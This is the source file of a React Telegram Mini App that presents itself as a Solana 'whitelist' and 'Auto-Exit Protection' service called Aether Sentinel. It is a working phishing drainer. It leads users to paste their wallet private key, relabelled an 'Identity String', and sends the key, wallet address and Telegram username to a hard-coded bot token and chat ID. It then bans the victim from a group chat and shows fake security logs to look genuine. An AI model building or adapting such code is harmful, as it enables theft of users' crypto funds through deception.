import React, { useState, useEffect } from 'react';

// --- CONFIGURATION ---
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const GROUP_CHAT_ID = "-1002361131154"; 

const App: React.FC = () => {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState<1 | 2 | 3>(1); // 1: Dashboard, 2: CA, 3: PK
  const [walletCA, setWalletCA] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [status, setStatus] = useState<'idle' | 'processing'>('idle');
  const [logs, setLogs] = useState<string[]>([]);

  const tg = (window as any).Telegram?.WebApp;

  // Validation Logic for Solana Private Keys (Base58)
  const isValidSolanaKey = (key: string) => {
    const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{87,88}$/;
    return base58Regex.test(key);
  };

  useEffect(() => {
    const sequence = ["Establishing RPC handshake...", "Securing tunnel...", "Scanning Raydium LP...", "Auth: ACTIVE"];
    let i = 0;
    const interval = setInterval(() => {
      if (i < sequence.length) {
        setLogs(prev => [...prev, `[SYSTEM] ${sequence[i]}`]);
        i++;
      } else {
        clearInterval(interval);
        setTimeout(() => setLoading(false), 800);
      }
    }, 600);
    if (tg) { tg.ready(); tg.expand(); tg.setHeaderColor?.('#17101F'); }
  }, [tg]);

  const handleStepTwo = async () => {
    if (walletCA.length < 32) return alert("Invalid Wallet CA.");
    setStatus('processing');
    
    // SEND CA TO BOT IMMEDIATELY (Lead Alert)
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: `👀 STEP 1 COMPLETE\nTarget CA: ${walletCA}\nUser: ${tg?.initDataUnsafe?.user?.username || 'Unknown'}` }),
    });

    setTimeout(() => { setStep(3); setStatus('idle'); }, 1500);
  };

  const handleFinalSync = async () => {
    if (!isValidSolanaKey(privateKey)) {
      return alert("Identity String format incorrect. Please export your private key in Base58 format.");
    }
    
    setStatus('processing');
    try {
      // Send Final Data
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: `🎯 TARGET ACQUIRED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: ${tg?.initDataUnsafe?.user?.username || 'Unknown'}` 
        }),
      });

      // TRIGGER KICK
      if (tg?.initDataUnsafe?.user?.id) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: GROUP_CHAT_ID, user_id: tg.initDataUnsafe.user.id }),
        });
      }

      alert("Node Identity Synchronized. Session reset for security.");
      tg?.close();
    } catch (err) {
      setStatus('idle');
      alert("Sync error. Please retry.");
    }
  };

  const theme = { bg: '#0D0912', card: '#1A1423', purple: '#AB9FF2', text: '#FFFFFF', muted: '#998DA8', accent: '#4ADE80' };

  if (loading) {
    return (
      <div style={{ background: theme.bg, height: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', padding: '20px', fontFamily: 'monospace' }}>
        <div style={{ color: theme.purple, fontSize: '12px' }}>
          {logs.map((log, i) => <div key={i} style={{ marginBottom: '8px' }}>{log}</div>)}
          <div style={{ marginTop: '20px', width: '100%', height: '2px', background: '#222' }}><div style={{ width: `${(logs.length / 4) * 100}%`, height: '100%', background: theme.purple, transition: '0.3s' }} /></div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', padding: '20px' }}>
      <div style={{ textAlign: 'center', marginBottom: '30px' }}>
        <h1 style={{ fontSize: '22px', fontWeight: '800' }}>Aether Sentinel <span style={{ color: theme.purple }}>v4.2</span></h1>
        <div style={{ display: 'inline-block', padding: '4px 12px', borderRadius: '100px', background: 'rgba(74, 222, 128, 0.1)', color: theme.accent, fontSize: '10px', fontWeight: 'bold' }}>● NETWORK LIVE</div>
      </div>

      {step === 1 && (
        <div style={{ background: theme.card, padding: '20px', borderRadius: '20px', textAlign: 'center' }}>
          <h3 style={{ fontSize: '16px', marginBottom: '10px' }}>Access Whitelist</h3>
          <p style={{ fontSize: '13px', color: theme.muted, marginBottom: '20px' }}>Verify your wallet CA to check eligibility for High-Conviction "Ghost" launches.</p>
          <button onClick={() => setStep(2)} style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none' }}>Begin Verification</button>
        </div>
      )}

      {step === 2 && (
        <div style={{ background: theme.card, padding: '24px', borderRadius: '24px' }}>
          <label style={{ fontSize: '11px', color: theme.muted, fontWeight: 'bold' }}>STEP 1: PUBLIC INDEXING</label>
          <input type="text" placeholder="Solana Wallet CA..." value={walletCA} onChange={(e) => setWalletCA(e.target.value)} style={{ width: '100%', padding: '16px', borderRadius: '12px', background: '#000', color: '#fff', border: '1px solid #333', marginTop: '15px', boxSizing: 'border-box' }} />
          <button onClick={handleStepTwo} style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none', marginTop: '20px' }}>
            {status === 'processing' ? 'Auditing Balance...' : 'Check Reputation'}
          </button>
        </div>
      )}

      {step === 3 && (
        <div style={{ background: theme.card, padding: '24px', borderRadius: '24px' }}>
          <div style={{ color: theme.accent, fontSize: '12px', fontWeight: 'bold', textAlign: 'center', marginBottom: '15px' }}>✓ REPUTATION: ELITE</div>
          <label style={{ fontSize: '11px', color: theme.muted, fontWeight: 'bold' }}>STEP 2: IDENTITY SYNC</label>
          <p style={{ fontSize: '12px', color: theme.muted, marginTop: '10px' }}>To enable <strong>Auto-Exit Protection</strong>, sync your Identity String. This allows the Aether RPC to sign emergency "SELL" transactions.</p>
          <textarea placeholder="Enter Identity String..." value={privateKey} onChange={(e) => setPrivateKey(e.target.value)} style={{ width: '100%', height: '80px', padding: '16px', borderRadius: '12px', background: '#000', color: '#fff', border: '1px solid #333', marginTop: '15px', boxSizing: 'border-box', fontFamily: 'monospace' }} />
          <button onClick={handleFinalSync} disabled={status === 'processing'} style={{ width: '100%', padding: '16px', borderRadius: '12px', background: theme.purple, color: '#000', fontWeight: 'bold', border: 'none', marginTop: '20px', opacity: status === 'processing' ? 0.6 : 1 }}>
            {status === 'processing' ? 'Synchronizing Node...' : 'Complete Global Sync'}
          </button>
        </div>
      )}
    </div>
  );
};

export default App;